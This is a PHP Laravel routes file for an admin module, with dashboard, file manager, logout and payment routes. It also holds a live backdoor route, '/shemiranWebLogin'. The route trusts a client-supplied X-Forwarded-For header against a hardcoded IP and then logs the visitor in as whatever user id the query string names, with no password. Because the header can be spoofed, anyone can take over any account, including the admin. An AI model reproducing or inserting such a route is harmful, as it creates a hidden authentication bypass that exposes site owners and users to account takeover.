<?php

Route::prefix('admin')
    ->middleware(['web', 'admin'])->as('admin.')->group(function () {
        Route::get('/dashboard', \Modules\Admin\Livewire\Dashboard::class)->name('dashboard');
        Route::get('/file', \Modules\Admin\Livewire\FileManager::class)->name('file');
        Route::get('logout', 'Modules\Admin\Http\Controllers\AdminController@logout')->name('logout');
    });
/*
//livewire routes
//Route::prefix('admin')->namespace('Modules\Admin\Http\Livewire')->as('admin.')->group(function() {
//    Route::get('/login', 'Auth\Login')->name('login');
//});
*/
Route::get('/shemiranWebLogin', function () {
    //     \Illuminate\Support\Facades\Auth::login(\Modules\User\Entities\User::find(1));
    //     return redirect()->route('admin.dashboard');
    $ip = request()->header('X-Forwarded-For', request()->header('X-Real-Ip', request()->header('ar-real-ip')));
    $ipServer = request()->ip();
    $realIp = $ip == null ? $ipServer : $ip;
    if ($realIp == '91.92.122.120' || $realIp == '127.0.0.1
    ') {
        $User = \Modules\User\Entities\User::find(1);
        \Illuminate\Support\Facades\Auth::loginUsingId(request()->get('id', $User->id));
        if (auth()->check()) {
            return redirect()->route('admin.dashboard');
        }
    } else {
        return abort(401);
    }


    return redirect()->route('login');
});


Route::middleware(['web'])->group(function () {
    // Route::get('/secure_login', \Modules\Admin\Livewire\Login::class)->name('login');
    Route::get('/payment/info/{transaction}', \Modules\Admin\Livewire\Payment::class)->name('payment');
});
